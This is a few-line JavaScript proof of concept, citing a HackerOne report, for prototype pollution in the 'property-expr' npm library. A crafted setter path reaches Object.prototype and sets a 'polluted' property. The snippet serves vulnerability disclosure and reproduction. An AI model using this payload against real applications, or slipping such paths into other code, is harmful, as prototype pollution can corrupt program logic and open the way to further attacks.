//https://hackerone.com/reports/910206
    let expr = require('property-expr');
    obj = {}
    
    expr.setter('constructor.prototype.polluted')(obj,"yes");
  